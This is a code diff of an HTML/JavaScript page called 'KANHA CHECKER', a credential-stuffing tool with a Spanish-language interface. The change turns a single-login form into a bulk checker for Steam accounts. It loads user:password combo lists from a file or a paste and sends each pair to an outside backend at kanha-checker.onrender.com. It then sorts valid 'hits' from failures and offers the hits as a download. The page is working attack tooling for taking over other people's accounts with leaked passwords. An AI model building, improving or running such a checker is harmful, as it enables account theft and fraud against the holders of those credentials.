@@ -6,80 +6,140 @@
     <title>KANHA CHECKER MULTI</title>
     <style>
         body { background: #0a0a0a; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
-        .tabs { display: flex; justify-content: center; margin-bottom: 20px; }
-        .tab { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; cursor: pointer; font-family: monospace; font-weight: bold; }
+        .tabs { display: flex; justify-content: center; margin-bottom: 20px; gap: 10px; flex-wrap: wrap; }
+        .tab { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px 15px; cursor: pointer; font-family: monospace; font-weight: bold; }
         .tab.active { background: #0f0; color: #000; }
-        input { width: 90%; max-width: 500px; padding: 12px; margin: 5px 0; background: #111; color: #0f0; border: 1px solid #0f0; font-family: monospace; font-size: 16px; }
-        button.check { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 15px; cursor: pointer; font-size: 16px; }
-        #result { background: #111; padding: 15px; margin-top: 20px; text-align: left; white-space: pre-wrap; border: 1px solid #333; max-width: 500px; margin-left: auto; margin-right: auto; font-size: 14px; }
-        .hit { color: #0f0; } .bad { color: #f00; }
+        
+        input[type="file"] { display: none; }
+        .file-label { background: #111; color: #0f0; border: 1px dashed #0f0; padding: 10px 20px; cursor: pointer; display: inline-block; margin-bottom: 10px; font-weight: bold; }
+        .file-label:hover { background: #0f0; color: #000; }
+
+        textarea { width: 90%; max-width: 500px; height: 120px; padding: 12px; margin: 5px 0; background: #111; color: #0f0; border: 1px solid #0f0; font-family: monospace; font-size: 14px; }
+        button.check { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 10px; cursor: pointer; font-size: 16px; }
+        button.download { background: #00f; color: #fff; padding: 10px 20px; font-weight: bold; border: none; margin-top: 20px; cursor: pointer; font-size: 14px; display: none; }
+        
+        .progress-container { width: 90%; max-width: 500px; background: #333; border-radius: 10px; margin: 20px auto; height: 20px; overflow: hidden; border: 1px solid #0f0; }
+        #progressBar { height: 100%; width: 0%; background: #0f0; transition: width 0.2s; }
+        #progressText { margin-top: 5px; font-weight: bold; }
+        
+        .lists-container { display: flex; flex-direction: column; align-items: center; gap: 15px; width: 100%; max-width: 600px; margin: 0 auto; }
+        .list-box { width: 100%; background: #111; padding: 15px; border: 1px solid #333; text-align: left; max-height: 200px; overflow-y: auto; font-size: 13px; }
+        .hit { color: #0f0; margin-bottom: 5px; }
+        .bad { color: #f00; margin-bottom: 5px; }
     </style>
 </head>
 <body>
     <h1>[ KANHA CHECKER ]</h1>
     
     <div class="tabs">
-        <button id="tab-crunchyroll" class="tab active" onclick="setService('crunchyroll')">CRUNCHYROLL</button>
-        <button id="tab-steam" class="tab" onclick="setService('steam')">STEAM</button>
+        <button id="tab-steam" class="tab active" onclick="setService('steam')">STEAM</button>
     </div>
 
-    <p id="hintText">Ingresá los datos de Crunchyroll:</p>
-    <input type="email" id="emailInput" placeholder="correo@gmail.com"><br>
-    <input type="password" id="passInput" placeholder="Contraseña"><br>
+    <p>Subí tu archivo .txt o pegá las cuentas acá:</p>
+    
+    <!-- BOTÓN PA SUBIR ARCHIVO -->
+    <label for="fileInput" class="file-label">SUBIR ARCHIVO .TXT</label>
+    <input type="file" id="fileInput" accept=".txt">
+    
+    <br>
+    <textarea id="combosInput" placeholder="kudon93:DIEP1996&#10;usuario2:pass123"></textarea><br>
+    
     <button class="check" onclick="startCheck()">INICIAR CHEQUEO</button>
     
-    <div id="result">Esperando datos...</div>
+    <div class="progress-container">
+        <div id="progressBar"></div>
+    </div>
+    <div id="progressText">0 / 0</div>
+
+    <div class="lists-container">
+        <div class="list-box" id="hitList">
+            <strong style="color: #0f0;">=== CUENTAS BUENAS (HITS) ===</strong><br><br>
+        </div>
+        <div class="list-box" id="badList">
+            <strong style="color: #f00;">=== CUENTAS MALAS (BAD) ===</strong><br><br>
+        </div>
+    </div>
+
+    <button class="download" id="downloadBtn" onclick="downloadHits()">DESCARGAR HITS</button>
 
     <script>
-        let currentService = 'crunchyroll';
+        let currentService = 'steam';
+        let hitsArray = [];
+
+        // LÓGICA PA LEER EL ARCHIVO TXT
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                document.getElementById('combosInput').value = event.target.result;
+            };
+            reader.readAsText(file);
+        });
 
         function setService(service) {
             currentService = service;
-            document.getElementById('tab-crunchyroll').className = service === 'crunchyroll' ? 'tab active' : 'tab';
-            document.getElementById('tab-steam').className = service === 'steam' ? 'tab active' : 'tab';
-            
-            if (service === 'steam') {
-                document.getElementById('hintText').innerText = "Ingresá los datos de Steam:";
-                document.getElementById('emailInput').placeholder = "usuario_steam";
-            } else {
-                document.getElementById('hintText').innerText = "Ingresá los datos de Crunchyroll:";
-                document.getElementById('emailInput').placeholder = "correo@gmail.com";
-            }
         }
 
         async function startCheck() {
-            const email = document.getElementById('emailInput').value.trim();
-            const pass = document.getElementById('passInput').value.trim();
-            const resultDiv = document.getElementById('result');
+            const text = document.getElementById('combosInput').value.trim();
+            if (!text) return alert("Poné algo, AGENT man.");
             
-            if (!email || !pass) return resultDiv.innerHTML = "<span class='bad'>Poné los datos, AGENT man.</span>";
-            
-            resultDiv.innerHTML = "Chequeando " + currentService + "... (puede tardar)";
-            try {
-                const res = await fetch("https://kanha-checker.onrender.com/api/check", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ service: currentService, combos: [`${email}:${pass}`] })
-                });
-                const data = await res.json();
+            const lines = text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+            const total = lines.length;
+            if (total === 0) return alert("Formato incorrecto. Usá usuario:contraseña");
+
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('progressText').innerText = `0 / ${total}`;
+            document.getElementById('hitList').innerHTML = '<strong style="color: #0f0;">=== CUENTAS BUENAS (HITS) ===</strong><br><br>';
+            document.getElementById('badList').innerHTML = '<strong style="color: #f00;">=== CUENTAS MALAS (BAD) ===</strong><br><br>';
+            document.getElementById('downloadBtn').style.display = 'none';
+            hitsArray = [];
+
+            for (let i = 0; i < total; i++) {
+                const combo = lines[i];
                 
-                if (!data.results) {
-                    resultDiv.innerHTML = `<span class='bad'>Error del Backend: ${JSON.stringify(data)}</span>`;
-                    return;
+                try {
+                    const res = await fetch("https://kanha-checker.onrender.com/api/check", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ service: currentService, combos: [combo] })
+                    });
+                    const data = await res.json();
+                    
+                    if (data.results && data.results[0]) {
+                        const r = data.results[0];
+                        const userPass = `${r.email}:${combo.split(':')[1]}`;
+                        
+                        if (r.valid) {
+                            document.getElementById('hitList').innerHTML += `<div class="hit">[HIT] ${userPass} | ${r.reason}</div>`;
+                            hitsArray.push(`${userPass} | ${r.reason}`);
+                        } else {
+                            document.getElementById('badList').innerHTML += `<div class="bad">[BAD] ${userPass} | ${r.reason}</div>`;
+                        }
+                    }
+                } catch (e) {
+                    document.getElementById('badList').innerHTML += `<div class="bad">[ERROR RED] ${combo}</div>`;
                 }
 
-                let html = "";
-                data.results.forEach(r => {
-                    if (r.valid) {
-                        html += `<span class="hit">[HIT] ${r.email} | ${r.reason}</span>\n`;
-                    } else {
-                        html += `<span class="bad">[BAD] ${r.email} | ${r.reason}</span>\n`;
-                    }
-                });
-                resultDiv.innerHTML = html;
-            } catch (e) {
-                resultDiv.innerHTML = `<span class='bad'>Error de conexión: ${e.message}</span>`;
+                const percent = ((i + 1) / total) * 100;
+                document.getElementById('progressBar').style.width = percent + '%';
+                document.getElementById('progressText').innerText = `${i + 1} / ${total}`;
             }
+
+            if (hitsArray.length > 0) {
+                document.getElementById('downloadBtn').style.display = 'inline-block';
+            }
+        }
+
+        function downloadHits() {
+            if (hitsArray.length === 0) return;
+            const blob = new Blob([hitsArray.join('\n')], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'hits_steam.txt';
+            a.click();
         }
     </script>
 </body>
